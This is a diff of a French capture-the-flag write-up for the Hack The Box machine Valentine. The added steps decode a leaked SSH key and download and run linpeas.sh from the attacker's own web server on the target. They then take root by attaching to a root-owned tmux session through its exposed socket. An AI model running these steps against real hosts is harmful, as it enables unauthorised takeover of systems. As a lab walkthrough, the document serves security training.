@@ -537,11 +537,26 @@ curl -o hype_key http://valentine.htb/dev/hype_key
 100  5383  100  5383    0     0   275k      0 --:--:-- --:--:-- --:--:--  276k
 ```
 
-- décodage de hype_key hex vers hype_key_decoded dans [cyberchef](https://gchq.github.io/CyberChef/)
+- Le fichier `/dev/notes.txt` ne contient qu’une simple todo list interne et n’apporte aucun élément exploitable pour la suite de l’attaque.
+
+```texte
+To do:
+
+1) Coffee.
+2) Research.
+3) Fix decoder/encoder before going live.
+4) Make sure encoding/decoding is only done client-side.
+5) Don't use the decoder/encoder until any of this is done.
+6) Find a better way to take notes.
+```
+
+
+
+- décodage de hype_key `hex` vers **hype_key_decoded** se passe dans [cyberchef](https://gchq.github.io/CyberChef/) et voici le résultat:
 
 ![cyberchef_hype_key](cyberchef_hype_key.png)
 
-- création 'copier/coller' dans nano du fichier hype_key_decoded et dans mon cas, copie vers /home/kali/tmp
+- création 'copier/coller' dans nano du fichier hype_key_decoded et dans mon cas, puisque je travaille dans un share windows, copie vers /home/kali/tmp
 
 ```bash
 cp .hype_key_decoded/home/kali/tmp
@@ -593,15 +608,77 @@ ef7xxxxxxxxxxxxxxxxxxxxxxxxxxx24e0
 
 ## Escalade de privilèges
 
-### Vers utilisateur intermédiaire (si applicable)
+### linpeas.sh
 
-- Méthode (sudoers, capabilities, SUID, timers, service vulnérable).
-- Indices collectés (configs, clés, cron, journaux).
+- dans kali linux
 
-### Vers root
-- Vecteur principal, exploitation, contournements.
-- Preuves : `id`, `hostnamectl`, `cat /root/root.txt`.
-- Remédiations possibles (leçons sécurité).
+```bash
+cd ~/utilitaires
+python3 -m http.server
+```
+
+- dans valentine.htb
+
+```
+cd /dev/thm
+wget http://<adresse tun0>:8000/linpeas.sh
+./linpeas.sh
+```
+
+### analyse linpeas
+
+Dans les résultats de linpeas.sh nous trouvons cette ligne surlignée en rouge+jaune:
+
+```bash
+root       1065  0.0  0.1  26416  1676 ?        Ss   Nov24   0:18 /usr/bin/tmux
+    -S /.devs/dev_sess
+```
+
+**tmux** est un multiplexeur de terminaux qui permet d’ouvrir plusieurs sessions persistantes dans un même terminal et de s’y reconnecter même après une déconnexion.
+
+Interprétation technique:
+
+- Le processus appartient à **root** → donc **session tmux contrôlée par root**.
+- Il tourne depuis `Nov24` → donc session persistante.
+- L’option `-S` indique que tmux utilise un **socket personnalisé** au lieu du socket classique ( `/tmp/tmux-<uid>/` ).
+
+Ici, le socket est :
+
+```
+/.devs/dev_sess
+```
+
+### Ce que ça implique
+
+Si on peut écrire sur ce socket, on peut :
+
+- **s'attacher à une session root**
+- **prendre le contrôle du shell root**
+- **obtenir un root shell complet immédiatement**
+
+## Vérifications 
+
+Dans le shell hype@valentine, on teste :
+
+```
+ls -l /.devs/dev_sess
+```
+
+Puis on s'attache avec :
+
+```
+tmux -S /.devs/dev_sess attach
+```
+
+Le résultat est un prompt root :
+
+```
+root@valentine:~#
+```
+
+**Nous sommes devenus root.**
+
+
 
 ---
 
